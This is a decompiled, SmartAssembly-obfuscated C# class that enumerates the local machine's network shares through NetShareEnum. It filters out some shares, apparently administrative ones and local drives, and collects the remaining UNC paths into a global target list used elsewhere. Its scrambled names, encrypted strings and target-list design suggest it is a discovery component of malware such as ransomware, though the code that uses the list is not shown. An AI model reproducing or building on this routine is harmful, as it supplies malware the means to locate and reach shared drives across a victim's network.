using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

public sealed class aWoJpNyMBThYR
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct XlqjWgZthYyB
	{
		public string WgpNLRLOAq;

		public uint BqlIYeIeswwhz;

		public string TnHQDcUxwNAeCUa;

		public XlqjWgZthYyB(string string_0, uint uint_0, string string_1)
		{
			WgpNLRLOAq = string_0;
			BqlIYeIeswwhz = uint_0;
			TnHQDcUxwNAeCUa = string_1;
		}

		public override string ToString()
		{
			return WgpNLRLOAq;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public XlqjWgZthYyB[] cvGHdYkhwJJ(string string_0)
	{
		List<XlqjWgZthYyB> list = new List<XlqjWgZthYyB>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(XlqjWgZthYyB));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				XlqjWgZthYyB item = (XlqjWgZthYyB)Marshal.PtrToStructure(ptr, typeof(XlqjWgZthYyB));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new XlqjWgZthYyB(getString_0(107407255) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void ulErpjjDIgIN()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			XlqjWgZthYyB[] array = new aWoJpNyMBThYR().cvGHdYkhwJJ(Environment.MachineName);
			XlqjWgZthYyB[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				XlqjWgZthYyB xlqjWgZthYyB = array2[i];
				if (xlqjWgZthYyB.ToString().Contains(getString_0(107405920)) || xlqjWgZthYyB.ToString().Contains(getString_0(107405943)) || xlqjWgZthYyB.ToString().Contains(getString_0(107405934)) || xlqjWgZthYyB.ToString().Contains(getString_0(107387809)) || logicalDrives.Contains(xlqjWgZthYyB.ToString().Replace(getString_0(107412255), getString_0(107405893))))
				{
					continue;
				}
				if (!fQUgTOUpJumL.qyAhWYLrtiOtS.Contains(getString_0(107387860) + Environment.MachineName + getString_0(107396944) + xlqjWgZthYyB))
				{
					fQUgTOUpJumL.qyAhWYLrtiOtS.Add(getString_0(107387860) + Environment.MachineName + getString_0(107396944) + xlqjWgZthYyB);
				}
				if (fQUgTOUpJumL.qqVKUcwYqRObMU)
				{
					try
					{
						Console.WriteLine(getString_0(107405888), getString_0(107387860) + Environment.MachineName + getString_0(107396944) + xlqjWgZthYyB);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (fQUgTOUpJumL.hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(fQUgTOUpJumL.LImNkSPhwOOQHW, getString_0(107405863) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static aWoJpNyMBThYR()
	{
		Strings.CreateGetStringDelegate(typeof(aWoJpNyMBThYR));
	}
}
